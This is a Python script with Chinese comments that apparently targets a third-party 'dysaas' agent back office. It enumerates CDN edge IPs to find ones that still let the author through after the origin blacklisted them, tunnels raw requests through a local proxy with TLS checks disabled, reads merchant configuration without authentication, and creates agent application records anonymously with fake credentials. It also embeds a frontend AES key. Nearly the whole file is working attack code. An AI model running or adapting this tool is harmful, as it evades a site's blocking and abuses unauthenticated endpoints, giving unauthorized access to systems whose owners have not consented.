#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""dysaas 代理后台最小可用客户端 + 边缘 IP 轮换 + 匿名代理注册。
用法：
  1) python dysaas_agent_client.py edges      # 穷举 CNAME 链的多边缘 IP，找仍然放行我方出口的
  2) python dysaas_agent_client.py client     # 匿名读商户配置（验证通道）
  3) python dysaas_agent_client.py register   # 匿名创建代理申请记录（appSave）
"""
import socket, ssl, json, base64, sys, time, urllib.request

PROXY = ('127.0.0.1', 7892)          # 本机系统代理；直连出口常被源站 L4 拉黑
EDGE = '203.0.113.50'              # 实测仍放行的边缘（源站 203.0.113.66 已被拉黑）
AHOST = 'example.com'   # 代理后台 vhost
SHOST = 'example.com'             # 主站 /xxa 网关 vhost（同一批边缘也反代）
KEY = b'pigxpigxpigxpigx'            # 代理后台前端 AES key = iv

AGENT_HEADERS = {
    'Accept': 'application/vnd.dysaas.v1+json',   # 决定路由到「代理后台」应用；application/json 会走平台侧
    'Content-Type': 'application/json',
    'clientCode': 'ffty', 'clientItem': 'ffty', 'language': 'zh-cn', 'device': '1',
    'pc': '1', 'merchantCode': '1', 'skinCode': 'a041', 'appid': 'a041',
}
SITE_HEADERS = {
    'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/json;charset=UTF-8;',
    'clientCode': 'ffty', 'clientItem': 'ffty', 'merchantCode': '1', 'language': 'zh-cn',
    'device': '1', 'pc': '1', 'skinCode': 'a041', 'appid': 'a041', 'source': '60',
}


def raw(ip, port, path, method='POST', headers=None, body=b'', sni=AHOST, t=25):
    h = dict(headers or {})
    h['Host'] = sni
    if body:
        h.setdefault('Content-Length', str(len(body)))
    h.setdefault('Connection', 'close')
    lines = ['%s %s HTTP/1.1' % (method, path)] + ['%s: %s' % kv for kv in h.items()]
    req = ('\r\n'.join(lines) + '\r\n\r\n').encode() + body
    s = socket.create_connection(PROXY, timeout=t)
    s.sendall(('CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n' % (ip, port, ip, port)).encode())
    if b' 200' not in s.recv(200).split(b'\r\n')[0]:
        raise OSError('proxy CONNECT failed')
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = ctx.wrap_socket(s, server_hostname=sni)
    sock.sendall(req)
    buf = b''
    sock.settimeout(t)
    try:
        while len(buf) < 400000:
            d = sock.recv(16384)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass
    sock.close()
    return buf


def aes_pkcs7(txt):
    from Crypto.Cipher import AES
    d = txt.encode()
    d += bytes([16 - len(d) % 16]) * (16 - len(d) % 16)
    return base64.b64encode(AES.new(KEY, AES.MODE_CBC, KEY).encrypt(d)).decode()


def doh_ips():
    ips = set()
    for base in ('https://dns.google/resolve', 'https://dns.alidns.com/resolve'):
        for name in ('target292.example.com', 'example.com', 'target293.example.com'):
            for rt in ('A', 'AAAA'):
                try:
                    op = urllib.request.build_opener(urllib.request.ProxyHandler(
                        {'http': 'http://127.0.0.1:7892', 'https': 'http://127.0.0.1:7892'}))
                    d = json.loads(op.open('%s?name=%s&type=%s' % (base, name, rt), timeout=12).read())
                    for a in d.get('Answer', []):
                        if a.get('type') in (1, 28):
                            ips.add(a['data'])
                except Exception:
                    pass
    out = set(i for i in ips if ':' not in i)
    for a in ips:
        if ':' in a:                      # 2a01:111:f102:8001::<ipv4hex> 尾部就是 IPv4
            tail = a.split('::')[-1].replace(':', '')
            if len(tail) == 8:
                out.add('%d.%d.%d.%d' % tuple(int(tail[i:i + 2], 16) for i in (0, 2, 4, 6)))
    return sorted(out)


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else 'client'
    if mode == 'edges':
        for ip in doh_ips():
            try:
                r = raw(ip, 443, '/agent/agent/api/v1/agentPlate/clientCode', 'POST', AGENT_HEADERS, b'{"param":{}}')
                print(ip, r.split(b'\r\n')[0].decode('utf-8', 'ignore'), r[-120:].decode('utf-8', 'ignore').strip())
            except Exception as e:
                print(ip, 'FAIL', e)
    elif mode == 'client':
        r = raw(EDGE, 443, '/agent/agent/api/v1/agentPlate/clientCode', 'POST', AGENT_HEADERS, b'{"param":{}}')
        print(r.decode('utf-8', 'ignore')[-600:])
    elif mode == 'register':              # 匿名创建代理申请（实测 code=0）
        body = json.dumps({'param': {'name': 'zgtest' + str(int(time.time()))[-5:],
                                     'password': 'Tt@123456', 'phone': '13500009999'}}).encode()
        r = raw(EDGE, 443, '/xxa/agent/api/v1/agent/appSave', 'POST', SITE_HEADERS, body, sni=SHOST)
        print(r.decode('utf-8', 'ignore')[-400:])


if __name__ == '__main__':
    main()
